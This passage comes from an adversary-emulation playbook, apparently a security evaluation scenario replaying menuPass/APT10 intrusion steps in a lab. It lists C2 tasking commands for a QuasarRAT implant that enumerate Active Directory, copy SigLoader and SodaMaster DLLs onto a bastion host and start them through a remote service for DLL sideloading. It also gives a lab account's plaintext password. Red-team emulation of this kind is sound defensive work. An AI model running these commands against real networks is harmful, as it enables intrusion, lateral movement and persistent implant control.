<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-report-april-2017.pdf" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Port scan Subsidiary A network</td>
<td><a href="../../resources/quasar/quasar.client/messages/portscanhandler.cs">PortScanHandler.cs</a></td>
<td>T1046 Network Service Discovery</td>
<td><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Nslookup hosts</td>
<td>-</td>
<td>T1016 System Network Configuration Discovery</td>
<td><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
 </details>
<br>
<doc-anchor-target id="step-6---preparation-for-lateral-movement-onto-subsidiary-b-network">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6---preparation-for-lateral-movement-onto-subsidiary-b-network">#</doc-anchor-trigger>
        <span>Step 6 - Preparation for Lateral Movement onto Subsidiary B Network</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>menuPass performs additional Active Directory enumeration, through which the
following are identified:</p>
<ul>
<li>A trusted domain DIGIREVENGE</li>
<li>A bastion workstation <code v-pre>kimeramon (10.20.20.11)</code> in DIGIREVENGE allowing authentication for Subsidiary A users</li>
<li>Hosts and users within DIGIREVENGE</li>
</ul>
<p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, menuPass downloads SigLoader and its necessary
components to the Subsidiary A Domain Controller, then moves them to the
bastion workstation <code v-pre>kimeramon (10.20.20.11)</code>.</p>
<p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, menuPass then remotely creates a service on the
bastion workstation <code v-pre>kimeramon (10.20.20.11)</code> to execute a legitimate binary
that will sideload SigLoader.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, execute <code v-pre>dsquery</code> to enumerate further information on
the active hosts</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;dsquery.exe&quot;, &quot;proc_args&quot;: &quot;* -filter \&quot;(objectCategory=computer)\&quot; -attr *&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, execute <code v-pre>dsquery</code> to enumerate further information on
trusted domains</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;dsquery.exe&quot;, &quot;proc_args&quot;: &quot;* -filter \&quot;(objectCategory=trusteddomain)\&quot; -attr *&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Ensure <code v-pre>DIGIREVENGE</code> is listed as a trusted domain</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">grep 'flatname: digirevenge' logs.txt -ia -C 10</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, execute <code v-pre>dsquery</code> to enumerate further information on
the active hosts within DIGIREVENGE</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;dsquery.exe&quot;, &quot;proc_args&quot;: &quot;* -filter \&quot;(objectCategory=computer)\&quot; -domain DIGIREVENGE -attr *&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Ensure <code v-pre>kimeramon (10.20.20.11)</code> is listed in the output</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">grep 'Workstation Contractor Bastion' logs.txt -ia</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, execute <code v-pre>dsquery</code> to enumerate further information on
the users within DIGIREVENGE</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;dsquery.exe&quot;, &quot;proc_args&quot;: &quot;* -filter \&quot;(&amp;(objectclass=User)(objectCategory=Person))\&quot; -domain DIGIREVENGE -attr *&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, download SigLoader and its necessary components
(SodaMaster version) and move them to the bastion workstation
<code v-pre>kimeramon (10.20.20.11)</code>. <strong>Wait until each command has returned before
executing the next</strong>.</p>
<ul>
<li><p>SigLoader layer 1</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 2, &quot;transfer_src&quot;: &quot;C:\\menu_pass\\Resources\\payloads\\quasar\\bastion_layer1.dll&quot;, &quot;transfer_dst&quot;: &quot;\\\\kimeramon.digirevenge.net\\C$\\Program Files\\Notepad++\\VERSION.dll&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>SigLoader layer 2</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 2, &quot;transfer_src&quot;: &quot;C:\\menu_pass\\Resources\\payloads\\quasar\\bastion_layer2.dll&quot;, &quot;transfer_dst&quot;: &quot;\\\\kimeramon.digirevenge.net\\admin$\\System32\\hkp.dll&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>SodaMaster</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 2, &quot;transfer_src&quot;: &quot;C:\\menu_pass\\Resources\\payloads\\quasar\\sodamaster.dll&quot;, &quot;transfer_dst&quot;: &quot;\\\\kimeramon.digirevenge.net\\admin$\\System32\\win64_tools.dll&quot;}'</code></pre>
</doc-codeblock></div>
</li>
</ul>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, remotely create a service on the bastion workstation
<code v-pre>kimeramon (10.20.20.11)</code> to execute a legitimate binary that will sideload
SigLoader</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;seq&quot;: 1, &quot;type&quot;: 1, &quot;proc_path&quot;: &quot;sc.exe&quot;, &quot;proc_args&quot;: &quot;\\\\kimeramon.digirevenge.net create Notepad binpath= \&quot;cmd /c \\\&quot;C:\\Program Files\\Notepad++\\notepad++.exe\\\&quot;\&quot; error= ignore start= demand&quot;}'</code></pre>
</doc-codeblock></div>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<ol>
<li><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/">https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/</a></li>
<li><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf">http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf</a></li>
<li><a href="https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf">https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf</a></li>
<li><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf">https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf</a></li>
<li><a href="https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html">https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html</a></li>
<li><a href="https://www.lac.co.jp/lacwatch/report/20201201_002363.html">https://www.lac.co.jp/lacwatch/report/20201201_002363.html</a></li>
<li><a href="https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf">https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf</a></li>
</ol>
 <details>
   <summary>:link: Click to expand source code links table</summary>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>Execute dsquery to enumerate active host information</td>
<td>-</td>
<td>T1018 Remote System Discovery</td>
<td><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/11/09055246/Modern-Asian-APT-groups-TTPs_report_eng.pdf" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Execute dsquery to enumerate trusted domains</td>
<td>-</td>
<td>T1482 Domain Trust Discovery</td>
<td><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/11/09055246/Modern-Asian-APT-groups-TTPs_report_eng.pdf" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Execute dsquery to enumerate user information</td>
<td>-</td>
<td>T1087.002 Account Discovery: Domain Account</td>
<td><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/11/09055246/Modern-Asian-APT-groups-TTPs_report_eng.pdf" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT downloads files</td>
<td><a href="../../resources/quasar/quasar.client/messages/filemanagerhandler.cs#L334">Execute File Download</a></td>
<td>T1105 Ingress Tool Transfer</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Dropped files were modified to contain shellcode</td>
<td><a href="../../resources/sigloader/#sigflip">SigFlip documentation</a></td>
<td>T1027.009 Obfuscated Files or Information: Embedded Payloads</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Dropped files&#x27; signatures are still valid</td>
<td><a href="../../resources/sigloader/#sigflip">SigFlip documentation</a></td>
<td>T1553.002 Subvert Trust Controls: Code Signing</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=The%20%E2%80%98vac.dll%E2%80%99%20DLL%20file%20is%20signed%20with%20a%20valid%2C%20legitimate%20digital%20signature%2C%20although%20the%20file%20has%20been%20tampered%20with." class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT execute commands</td>
<td><a href="../../resources/quasar/quasar.client/messages/taskmanagerhandler.cs#L179">ExecuteProcess</a></td>
<td>T1106 Native API</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Create service</td>
<td>-</td>
<td>T1543.003 Create or Modify System Process: Windows Service</td>
<td><a href="https://www.mandiant.com/resources/blog/apt10-menupass-group" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
 </details>
<br>
<doc-anchor-target id="step-7---lateral-movement-onto-subsidiary-b-network">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---lateral-movement-onto-subsidiary-b-network">#</doc-anchor-trigger>
        <span>Step 7 - Lateral Movement onto Subsidiary B Network</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, menuPass remotely executes the created service on the
bastion workstation <code v-pre>kimeramon (10.20.20.11)</code> to execute a legitimate binary
that will sideload SigLoader.</p>
<p>On execution, SigLoader will again perform its layered loading, with the final
loaded payload this time being SodaMaster. Once SodaMaster is executed, it will
perform the following initialization steps:</p>
<ul>
<li>Perform automated host discovery</li>
<li>Execute anti-sandbox checks</li>
<li>Add itself to Windows Defender&#x27;s whitelist</li>
<li>Check Defender configurations</li>
<li>Establish C2 communication using a redirector at
<code v-pre>notepad-plusplus[.]eu (121.93.44.121)</code></li>
</ul>
<p>Eventually, a file server administrator <code v-pre>kmimi</code> from
Subsidiary B&#x27;s network RDPs in to the bastion workstation <code v-pre>kimeramon (10.20.20.11)</code>
to perform tasks then disconnects from their session when complete.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Using the QuasarRAT implant on the Domain Controller, remotely execute the
created service</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;seq&quot;: 1, &quot;type&quot;: 1, &quot;proc_path&quot;: &quot;sc.exe&quot;, &quot;proc_args&quot;: &quot;\\\\kimeramon.digirevenge.net start Notepad&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>This command should return <code v-pre>FAILED 1053</code>. This is expected because
notepad++.exe is not configured as a service binary that would properly
respond to the service manager. However, notepad++.exe <em>will still execute</em>
and <em>should remain running</em> even after the command returns the failed message.</li>
</ul>
</li>
<li><p>Confirm C2 registration of SodaMaster</p>
</li>
</ul>
<blockquote>
<p><span class="docs-emoji">&#x23E9;</span> Emulate the following legitimate user activity:</p>
<ul>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> initiate an RDP session from the jumpbox <code v-pre>homelander (176.59.17.22)</code> to <code v-pre>kimeramon (10.20.20.11)</code> as the file server administrator:</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>DIGIREVENGE\kmimi</td>
<td>cHjc3p3hJHJYPUzT@</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>Open Command Prompt, mount the file share:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">net use F: \\10.20.10.23\F$ /persistent:yes</code></pre>
</doc-codeblock></div>
</li>
<li><p>Check the drive was mounted properly:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">net use</code></pre>
</doc-codeblock></div>
</li>
<li><p>Disconnect from RDP and you should return to <code v-pre>homelander (176.59.17.22)</code></p>
</li>
</ul>
<p><span class="docs-emoji">&#x23E9;</span> Resume red team activity</p>
</blockquote>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<ol>
<li><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/">https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/</a></li>
<li><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf">http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf</a></li>
<li><a href="https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf">https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf</a></li>
<li><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf">https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf</a></li>
<li><a href="https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html">https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html</a></li>
<li><a href="https://www.lac.co.jp/lacwatch/report/20201201_002363.html">https://www.lac.co.jp/lacwatch/report/20201201_002363.html</a></li>
<li><a href="https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf">https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf</a></li>
</ol>
 <details>
   <summary>:link: Click to expand source code links table</summary>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>Execute Notepad++.exe to perform DLL sideloading</td>
<td>-</td>
<td>T1574.002 Hijack Execution Flow: DLL Side-Loading</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=The%20layer%20I%20loader%20decrypts%20the%20layer%20II%20loader%20shellcode%20from%20the%20embedded%20data" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SigLoader decrypts shellcode (combination of XOR/AES/DES)</td>
<td><a href="../../resources/sigloader/src/layer1_loader.cpp#L272">decrypt</a></td>
<td>T1140 Deobfuscate/Decode Files or Information</td>
